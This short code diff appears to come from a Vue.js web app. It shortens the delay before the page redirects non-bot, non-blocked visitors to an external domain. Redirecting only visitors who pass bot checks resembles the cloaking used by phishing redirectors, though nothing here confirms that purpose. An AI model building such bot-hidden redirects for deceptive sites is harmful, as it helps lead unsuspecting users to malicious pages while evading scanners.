@@ -49,7 +49,7 @@ const app = createApp({
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
           window.location.href = 'https://inb.logofatu.ro/';
-        }, 3000);
+        }, 1000);
       }
 
       loading.value = false; // Stop the loading spinner
